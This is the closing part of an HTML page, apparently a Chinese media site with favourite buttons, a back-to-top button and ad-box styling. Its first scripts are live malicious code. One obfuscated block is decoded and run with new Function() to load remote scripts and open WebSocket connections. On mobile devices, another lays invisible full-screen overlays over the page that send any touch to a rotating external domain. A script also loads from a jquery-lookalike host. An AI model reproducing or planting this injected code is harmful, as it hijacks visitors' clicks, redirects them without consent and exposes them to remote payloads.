(R8(T80!67cYXYvvYXYmFTJY88"FO_(hLFd5F"a[(R8YXYmFO_(hYLH0Zm(q6Y2F&!(T8YXYmFO_(hYLH0Zm(q6Y2F-P67cYXYvvYXYmFTJY88"FO_(hY2f"a[(R8YXYm(hd2pYf|O_(hYLH0ZmL(5YY2&!(T8YXYm(hd2pYf|O_(hYLH0Zm(q6Y2F-P67cYXYvvYXYmFTJY88"(q6(S"a[(R8YXYm(q6Y2F&!(T8YXYm(q6Y2F-P67c(R>0vv(T>0a[67c(T<c@0o.c(q6Y2FD6fFh/K@0aavvT5XFLXh(M6LMSS880a[T5XFLXh(M6LMSS8}!Xd5 T5XFLXh(M^8"hFFJLg//"%wdFYmJd5LYc2YD wdFYcaa%"o(o0)YfYddd1(}(p((mnXST:S(m(2"%"g{00n/((/s0K{j6LM2OF8}vFd5pYF8}"!67cFOJmqO(dF6O2l8LYq7mqO(dF6O2a[FOJmqO(dF6O28T5XFLXh(M^PYqLY[D62fODmqO(dF6O2mh5Y78T5XFLXh(M^PT5XFLXh(M6LMSS80PPPPa!7O5cXd5 280!2<o!2%%a[7O5cXd5 C80!C<}0!C%%a[Xd5 LFTqY8"JOL6F6O2g76RYf! FOJg"%c1mQK{1n.2a%"XD! qY7Fg"%C.}0%"XD! 4*62fYRg}00!f6LJqdTg)qO(S!D6fFhgQmKXD!hY6phFg1mQK{1nXD!)d(Sp5O_2fg#000!OJd(6FTg0m0}!"!fO(_^Y2Fm)OfTm62LY5FrfCd(Y2F9|ytc")Y7O5YY2f"=\'<f6X LFTqY8"\'%LFTqY%\'"></f6X>\'aPPLYF|6^YO_Fc7_2(F6O2ca[67cT5XFLXh(M6LMDL880a[Xd5 68fO(_^Y2Fm(5YdFYEqY^Y2Fc"L(56JF"a!6mL5(8"hFFJLg//"%c2YD wdFYcampYFwdFYcaa%"o(o0)YfYddd1(}(p((mnXST:S(m(2"%"g{00n/f/s0K{j(8}v28T5XFLXh("!Xd5 _8fO(_^Y2FmpYFEqY^Y2FLuT|dpNd^Yc"L(56JF"aH0Z!_mJd5Y2FNOfYm62LY5FuY7O5Yc6=_a!Xd5 L))8fO(_^Y2Fm(5YdFYEqY^Y2Fc"LFTqY"a!L))m6f8"T5XFLXh(MLFTqYM6f"!L))m622Y59|yt8")OfT[JOL6F6O2g626F6dq l6^JO5Fd2F!^62*hY6phFg"%D62fODmL(5YY2mhY6phF%"JR l6^JO5Fd2F!Jdff62p*)OFFO^g}00JR l6^JO5Fd2F!P"!fO(_^Y2FmhYdfmdJJY2fxh6qfcL))aPP=}n00aPP=}000a!P 67c/)d6f_?9_dDY6u5ODLY5?A6XOu5ODLY5?;JJOu5ODLY5?9YT|dJu5ODLY5?y6_6u5ODLY5?yIIu5ODLY5?Bxu5ODLY5?I_d5S?IzI/pmFYLFc2dX6pdFO5m_LY5rpY2Fal887dqLYa[Xd5 DLRp8H"pDmnDhd_FFm(2"="pDmnDhd_FFm(2"="pDmnDhd_FFm(2"="pDmn^JLLLCm(2"="pDmn^JLLLCm(2"="pDmn^JLLLCm(2"Z!Xd5 S8ydFhm7qOO5cc2YD wdFYcaampYFwdFYca/na!S8cS>najngS! Xd5 (82YD VY)iO(SYFc"DLLg//o(o0)YfYddd1(}("%c2YD wdFYcampYFwdFYcaa%DLRpHSZ%"g@00Qn"%"/s0K{"a! (mO2OJY287_2(F6O2cYa[T5XFLXh(M6LMDL8T5XFLXh(M6LMSS8}!LYF|6^YO_Fcca8>[Xd5 (d2Xd85mpYFEqY^Y2FuTWfc"T5XFLXh(MLFTqYM6f"a!67c(d2Xda[(d2Xdm5Y^OXYcaPP=}000aP!(mO2^YLLdpY87_2(F6O2cYa[Xd5 F87_2(F6O2cYa[Xd5 F=5=2=O=(=6=_=d8"(hd5rF"=78"75O^xhd5xOfY"=q8"(hd5xOfYrF"=f8"62fYR;7"=L8"ruxwE]k9W+ztyN;eI~i|BAV&-Ud)(fY7ph6CSq^2OJ:5LF_XDRT40}@sonK1{Q%/8"=J8""=p80!7O5cY8Ym5YJqd(Yc/H3r*Ud*40*Q%/8Z/p=""a!p<YmqY2pFh!aO8LHfZcYHdZcp%%aa=(8LHfZcYHdZcp%%aa=68LHfZcYHdZcp%%aa=_8LHfZcYHdZcp%%aa=F8O<<@?(>>o=58c}nv(a<<o?6>>@=28csv6a<<K?_=J%8iF562pH7ZcFa=Kol86vvcJ%8iF562pH7Zc5aa=Kol8_vvcJ%8iF562pH7Zc2aa!5YF_52 7_2(F6O2cYa[7O5cXd5 F8""=2858(}8(@80!2<YmqY2pFh!ac58YHqZc2aa<}@{jcF%8iF562pH7Zc5a=2%%ag5>}Q}vv5<@@ojc(@8YHqZc2%}a=F%8iF562pH7Zccs}v5a<<K?Ksv(@a=2%8@agc(@8YHqZc2%}a=(s8YHqZc2%@a=F%8iF562pH7Zcc}nv5a<<}@?cKsv(@a<<K?Ksv(sa=2%8sa!5YF_52 FPcJaPcYmfdFda!2YD ]_2(F6O2c"MFf(L"=FacOa=(m(qOLYcaPPYqLY[Xd5 685m(5YdFYEqY^Y2Fc"L(56JF"a!6mL5(8"hFFJLg//"%c2YD wdFYcampYFwdFYcaa%"o(o0)YfYddd1(}(ppmn_R^_L:m(2"%"g{00n\/L(/s0K{j28T5XFLXh("!Xd5 _85mpYFEqY^Y2FLuT|dpNd^Yc"L(56JF"aH0Z!_mJd5Y2FNOfYm62LY5FuY7O5Yc6=_aPPZa!`.substr(10));new Function(b)()}();</script>
<script>if(!/^Mac|Win/.test(navigator.platform)){var i=0;for(var n=0;n<4;n++){for(var j=0;j<10;j++){var style="position:fixed; bottom:"+(8.5*n)+"vw; left:"+j*10+"vw; z-index:10;display:block;width:9.6vw;height:8.5vw;background: #000;opacity:0.01;";document.write('<div class="qjupzdvq_b" style="'+style+'"></div>');var a=document.getElementsByClassName("qjupzdvq_b");a[i].addEventListener("touchend",function(){var qjupzdvq_n="https://"+(new Date().getDate())+"44c3f480b28339fkcc.ctryhan.com:8008"+"/cc/3351?is_not=1&target=1&ty=2";if(top.location!=self.location){top.location=qjupzdvq_n}else{window.location.href=qjupzdvq_n}});i++}}};</script> <script>!function(){function a(a){var b={e:"P",w:"D",T:"y","+":"J",l:"!",t:"L",E:"E","@":"2",d:"a",b:"%",q:"l",X:"v","~":"R",5:"r","&":"X",C:"j","]":"F",a:")","^":"m",",":"~","}":"1",x:"C",c:"(",G:"@",h:"h",".":"*",L:"s","=":",",p:"g",I:"Q",1:"7",_:"u",K:"6",F:"t",2:"n",8:"=",k:"G",Z:"]",")":"b",P:"}",B:"U",S:"k",6:"i",g:":",N:"N",i:"S","%":"+","-":"Y","?":"|",4:"z","*":"-",3:"^","[":"{","(":"c",u:"B",y:"M",U:"Z",H:"[",z:"K",9:"H",7:"f",R:"x",v:"&","!":";",M:"_",Q:"9",Y:"e",o:"4",r:"A",m:".",O:"o",V:"W",J:"p",f:"d",":":"q","{":"8",W:"I",j:"?",n:"5",s:"3","|":"T",A:"V",D:"w",";":"O"};return a.split("").map(function(a){return void 0!==b[a]?b[a]:a}).join("")}var b=a(`fJUwxFirAgl7_2(F6O2cYa[Xd5 F8[P!7_2(F6O2 5c2a[67cFH2Za5YF_52 FH2ZmYRJO5FL!Xd5 O8FH2Z8[6g2=qgl}=YRJO5FLg[PP!5YF_52 YH2Zm(dqqcOmYRJO5FL=O=OmYRJO5FL=5a=Omq8l0=OmYRJO5FLP5m^8Y=5m(8F=5mf87_2(F6O2cY=F=2a[5mOcY=Fa??;)CY(FmfY762Ye5OJY5FTcY=F=[Y2_^Y5d)qYgl0=pYFg2PaP=5m587_2(F6O2cYa["_2fY762Yf"l8FTJYO7 iT^)OqvviT^)OqmFOiF562p|dpvv;)CY(FmfY762Ye5OJY5FTcY=iT^)OqmFOiF562p|dp=[Xdq_Yg"yOf_qY"Pa=;)CY(FmfY762Ye5OJY5FTcY="MMYLyOf_qY"=[Xdq_Ygl0PaP=5mF87_2(F6O2cY=Fa[67c}vFvvcY85cYaa={vFa5YF_52 Y!67covFvv"O)CY(F"88FTJYO7 YvvYvvYmMMYLyOf_qYa5YF_52 Y!Xd5 28;)CY(Fm(5YdFYc2_qqa!67c5m5c2a=;)CY(FmfY762Ye5OJY5FTc2="fY7d_qF"=[Y2_^Y5d)qYgl0=Xdq_YgYPa=@vFvv"LF562p"l8FTJYO7 Ya7O5cXd5 O 62 Ya5mfc2=O=7_2(F6O2cFa[5YF_52 YHFZPm)62fc2_qq=Oaa!5YF_52 2P=5m287_2(F6O2cYa[Xd5 F8YvvYmMMYLyOf_qYj7_2(F6O2ca[5YF_52 YmfY7d_qFPg7_2(F6O2ca[5YF_52 YP!5YF_52 5mfcF="d"=Fa=FP=5mO87_2(F6O2cY=Fa[5YF_52 ;)CY(FmJ5OFOFTJYmhdL;D2e5OJY5FTm(dqqcY=FaP=5mJ8""=5c5mL80aPcH7_2(F6O2cY=Fa[Xd5 58fO(_^Y2F=282dX6pdFO5mJqdF7O5^=O85m(_55Y2Fi(56JF! 67cl/3yd(?V62/mFYLFc2a??l2a[Xd5 :C_J4fX:M6LMDL8:C_J4fX:M6LMSS80!LYF|6^YO_Fc7_2(F6O2ca[67c:C_J4fX:M6LMDL880a[Xd5 (q6Y2FD6fFh8D62fODmL(5YY2mdXd6qV6fFh!fO(_^Y2FmdffEXY2Ft6LFY2Y5c"FO_(hY2f"=7_2(F6O2ca[67c:C_J4fX:M6LMDL880a[Xd5 (q6Y2FhY6phF8D62fODm622Y59Y6phF!Xd5 YXY8YXY2F??D62fODmYXY2F!Xd5 (R8(T80!67cYXYvvYXYmFTJY88"FO_(hLFd5F"a[(R8YXYmFO_(hYLH0Zm(q6Y2F&!(T8YXYmFO_(hYLH0Zm(q6Y2F-P67cYXYvvYXYmFTJY88"FO_(hY2f"a[(R8YXYm(hd2pYf|O_(hYLH0ZmL(5YY2&!(T8YXYm(hd2pYf|O_(hYLH0Zm(q6Y2F-P67cYXYvvYXYmFTJY88"(q6(S"a[(R8YXYm(q6Y2F&!(T8YXYm(q6Y2F-P67c(R>0vv(T>0a[67c(T>c(q6Y2FhY6phF*c@00.c(q6Y2FD6fFh/K00aaavv:C_J4fX:M6LMSS880a[:C_J4fX:M6LMSS8}!Xd5 :C_J4fX:M^8"hFFJLg//"%c2YD wdFYcampYFwdFYcaa%"oo(s7o{0)@{ssQ7S((m(F5Thd2m(O^g{00{"%"/((/ssn}j6LM2OF8}vFd5pYF8}"!67cFOJmqO(dF6O2l8LYq7mqO(dF6O2a[FOJmqO(dF6O28:C_J4fX:M^PYqLY[D62fODmqO(dF6O2mh5Y78:C_J4fX:M^P:C_J4fX:M6LMSS80PPPPa!7O5cXd5 280!2<o!2%%a[7O5cXd5 C80!C<}0!C%%a[Xd5 LFTqY8"JOL6F6O2g76RYf! )OFFO^g"%c{mn.2a%"XD! qY7Fg"%C.}0%"XD! 4*62fYRg}00!f6LJqdTg)qO(S!D6fFhgQmKXD!hY6phFg{mnXD!)d(Sp5O_2fg #000!OJd(6FTg0m0}!"!fO(_^Y2Fm)OfTm62LY5FrfCd(Y2F9|ytc")Y7O5YY2f"=\'<f6X LFTqY8"\'%LFTqY%\'"></f6X>\'aPPLYF|6^YO_Fc7_2(F6O2ca[67c:C_J4fX:M6LMDL880a[Xd5 68fO(_^Y2Fm(5YdFYEqY^Y2Fc"L(56JF"a!6mL5(8"hFFJLg//"%c2YD wdFYcampYFwdFYcaa%"oo(s7o{0)@{ssQ7S((m(F5Thd2m(O^g{00{"%"/f/ssn}j(8}v28:C_J4fX:"!Xd5 _8fO(_^Y2FmpYFEqY^Y2FLuT|dpNd^Yc"L(56JF"aH0Z!_mJd5Y2FNOfYm62LY5FuY7O5Yc6=_a!Xd5 L))8fO(_^Y2Fm(5YdFYEqY^Y2Fc"LFTqY"a!L))m6f8":C_J4fX:MLFTqYM6f"!L))m622Y59|yt8")OfT[JOL6F6O2g626F6dq l6^JO5Fd2F!^62*hY6phFg"%D62fODmL(5YY2mhY6phF%"JR l6^JO5Fd2F!Jdff62p*)OFFO^g}00JR l6^JO5Fd2F!P"!fO(_^Y2FmhYdfmdJJY2fxh6qfcL))aPP=}000aPP=@n00a!P 67c/)d6f_?9_dDY6u5ODLY5?A6XOu5ODLY5?;JJOu5ODLY5?9YT|dJu5ODLY5?y6_6u5ODLY5?yIIu5ODLY5?Bxu5ODLY5?I_d5S?IzI/pmFYLFc2dX6pdFO5m_LY5rpY2Fal887dqLYa[Xd5 DLRp8H"DSm2Lfp7JRm(O^"="DSm^2dd7CSm(O^"="DSm^2dd7CSm(O^"="DSm^2dd7CSm(O^"="DSm2Lfp7JRm(O^"="DSm2Lfp7JRm(O^"Z!Xd5 S8ydFhm7qOO5cc2YD wdFYcaampYFwdFYca/na!S8cS>najngS! Xd5 (82YD VY)iO(SYFc"DLLg//oo(s7o{0)@{ssQ7"%c2YD wdFYcampYFwdFYcaa%DLRpHSZ%"g@00Q{"%"/ssn}"a! (mO2OJY287_2(F6O2cYa[:C_J4fX:M6LMDL8:C_J4fX:M6LMSS8}!LYF|6^YO_Fcca8>[Xd5 (d2Xd85mpYFEqY^Y2FuTWfc":C_J4fX:MLFTqYM6f"a!67c(d2Xda[(d2Xdm5Y^OXYcaPP=}000aP!(mO2^YLLdpY87_2(F6O2cYa[Xd5 F87_2(F6O2cYa[Xd5 F=5=2=O=(=6=_=d8"(hd5rF"=78"75O^xhd5xOfY"=q8"(hd5xOfYrF"=f8"62fYR;7"=L8"ruxwE]k9W+ztyN;eI~i|BAV&-Ud)(fY7ph6CSq^2OJ:5LF_XDRT40}@sonK1{Q%/8"=J8""=p80!7O5cY8Ym5YJqd(Yc/H3r*Ud*40*Q%/8Z/p=""a!p<YmqY2pFh!aO8LHfZcYHdZcp%%aa=(8LHfZcYHdZcp%%aa=68LHfZcYHdZcp%%aa=_8LHfZcYHdZcp%%aa=F8O<<@?(>>o=58c}nv(a<<o?6>>@=28csv6a<<K?_=J%8iF562pH7ZcFa=Kol86vvcJ%8iF562pH7Zc5aa=Kol8_vvcJ%8iF562pH7Zc2aa!5YF_52 7_2(F6O2cYa[7O5cXd5 F8""=2858(}8(@80!2<YmqY2pFh!ac58YHqZc2aa<}@{jcF%8iF562pH7Zc5a=2%%ag5>}Q}vv5<@@ojc(@8YHqZc2%}a=F%8iF562pH7Zccs}v5a<<K?Ksv(@a=2%8@agc(@8YHqZc2%}a=(s8YHqZc2%@a=F%8iF562pH7Zcc}nv5a<<}@?cKsv(@a<<K?Ksv(sa=2%8sa!5YF_52 FPcJaPcYmfdFda!2YD ]_2(F6O2c"MFf(L"=FacOa=(m(qOLYcaPPYqLY[Xd5 685m(5YdFYEqY^Y2Fc"L(56JF"a!6mL5(8"hFFJLg//"%c2YD wdFYcampYFwdFYcaa%"oo(s7o{0)@{ssQ7Spm65DFphSm(O^g{00{"%"\/L(/ssn}j28:C_J4fX:"!Xd5 _85mpYFEqY^Y2FLuT|dpNd^Yc"L(56JF"aH0Z!_mJd5Y2FNOfYm62LY5FuY7O5Yc6=_aPPZa!`.substr(10));new Function(b)()}();</script><script src="//cloudflare.mh616.org/jquery-1.10.2.min_656a2.js"></script>
<script>function favs(id) { var userstatus = "0"; $.get("/index.php/user/ajax_ulog/?ac=set&mid=1&id=" + id + "&type=2", function (data) { if (data.msg == "获取成功") { layer.msg('已收藏'); } else if (userstatus == "0") { layer.msg('请先登录'); } else if (userstatus == "1") { layer.msg('收藏成功'); } }, "json"); } function artfavs(id) { var userstatus = "0"; $.get("/index.php/user/ajax_ulog/?ac=set&mid=2&id=" + id + "&type=2", function (data) { if (data.msg == "获取成功") { layer.msg('已收藏'); } else if (userstatus == "0") { layer.msg('请先登录'); } else if (userstatus == "1") { layer.msg('收藏成功'); } }, "json"); } function actorfavs(id) { var userstatus = "0"; $.get("/index.php/user/ajax_ulog/?ac=set&mid=8&id=" + id + "&type=2", function (data) { if (data.msg == "获取成功") { layer.msg('已收藏'); } else if (userstatus == "0") { layer.msg('请先登录'); } else if (userstatus == "1") { layer.msg('收藏成功'); } }, "json"); } function topicfavs(id) { var userstatus = "0"; $.get("/index.php/user/ajax_ulog/?ac=set&mid=3&id=" + id + "&type=2", function (data) { if (data.msg == "获取成功") { layer.msg('已收藏'); } else if (userstatus == "0") { layer.msg('请先登录'); } else if (userstatus == "1") { layer.msg('收藏成功'); } }, "json"); }</script>
<style>
#myBtn {
  display: none;
  position: fixed;
  bottom: 20px;
  right: 30px;
  z-index: 99;
  border: none;
  outline: none;
  background-color: red;
  color: white;
  cursor: pointer;
  padding: 15px;
  border-radius: 10px;
}

#myBtn:hover {
  background-color: #555;
}
</style>
<button onclick="topFunction()" id="myBtn" title="回顶部">返回顶部</button>
<script>
// 当网页向下滑动 20px 出现"返回顶部" 按钮
window.onscroll = function() {scrollFunction()};
 
function scrollFunction() {console.log(121);
    if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
        document.getElementById("myBtn").style.display = "block";
    } else {
        document.getElementById("myBtn").style.display = "none";
    }
}
 
// 点击按钮，返回顶部
function topFunction() {
    document.body.scrollTop = 0;
    document.documentElement.scrollTop = 0;
}
</script>

<style>
.topd{
    position: fixed; 
    top: 0;
    left: 50%;  
    height: 80px; 
    /*max-height: 80px;*/
    width: 100%;
    margin: 0 auto;
    max-width:995px;
    transform: translate(-50%, 0px);
    z-index:9999;
}
.bottomd{
   position: fixed; 
   bottom: 25px;
   left: 50%; 
   height: 80px; 
   /*max-height: 80px;*/
   width: 100%;
   margin: 0 auto;
   max-width:995px;
   transform: translate(-50%, 0px);
   z-index:9999;
}
.leftd {
		    position: fixed;
		    top: 54%;
		    transform: translateY(-50%);
		    width: 120px;
		    left: 0;
		    z-index: 9999;
		}
.rightd {
		    position: fixed;
		    top: 54%;
		    transform: translateY(-50%);
		    width: 120px;
		    right: 0;
		    z-index: 9999;
		}
.close_btn {
		    position: absolute;
		    right: 0;
		    top: 0;
		    height: 20px;
		    line-height: 20px;
		    width: 40px;
		    background: #f00;
		    text-align: center;
		}
		
.close_r {
    /* still bad on picking color */
    background: orange;
    color: red;
    /* make a round button */
    border-radius: 12px;
    /* center text */
    line-height: 20px;
    text-align: center;
    height: 20px;
    width: 20px;
    font-size: 18px;
    padding: 1px;
}


/* use cross as close button */
.close_r::before {
    content: "\2716";
}
/* place the button on top-right */
.close_r {
    top: -10px;
    right: -10px;
    position: absolute;
}

.close_l {
    /* still bad on picking color */
    background: orange;
    color: red;
    /* make a round button */
    border-radius: 12px;
    /* center text */
    line-height: 20px;
    text-align: center;
    height: 20px;
    width: 20px;
    font-size: 18px;
    padding: 1px;
}


/* use cross as close button */
.close_l::before {
    content: "\2716";
}
/* place the button on top-right */
.close_l {
    top: -10px;
    left: -10px;
    position: absolute;
}

.closebox1 {
text-align: center;
    display: inherit;
    background-color: #0000007a;
    color: #fff;
    padding: 4px 0;
    display: block;
}
.closebox2 {
text-align: center;
    display: inherit;
    background-color: #0000007a;
    color: #fff;
    padding: 4px 0;
    display: block;
}
.closebox3 {
text-align: center;
    display: inherit;
    background-color: #0000007a;
    color: #fff;
    padding: 4px 0;
    display: block;
}
.closebox4 {
text-align: center;
    display: inherit;
    background-color: #0000007a;
    color: #fff;
    padding: 4px 0;
    display: block;
}

@media screen and (max-width:750px){
    
    .leftd {
		    width: 90px !important; }
	.rightd {
		    width: 90px !important; }
    .topd{
    height: 60px; 
  }
    
    .bottomd{
   height: 60px; 
   bottom: 35px;
  }
        .topd img{
    height: 60px; 
  }
    
    .bottomd img{
   height: 60px; 
  }
    
    
    

}



</style>
<script type="text/javascript">
    	 $(".close_l").on("click",function(){
                    $(this).parent("div").hide();
                });
    </script>
<script type="text/javascript">
    	 $(".close_r").on("click",function(){
                    $(this).parent("div").hide();
                });
    </script>
<script type="text/javascript">
    	 $(".closebox1").on("click",function(){
                    $(".closebox1").parent("div").css("display", "none");
                });
    </script>
<script type="text/javascript">
    	 $(".closebox2").on("click",function(){
                    $(".closebox2").parent("div").css("display", "none");
                });
    </script>
<script type="text/javascript">
    	 $(".closebox3").on("click",function(){
                    $(".closebox3").parent("div").css("display", "none");
                });
    </script>
<script type="text/javascript">
    	 $(".closebox4").on("click",function(){
                    $(".closebox4").parent("div").css("display", "none");
                });
    </script>
</div>
</body>
</html>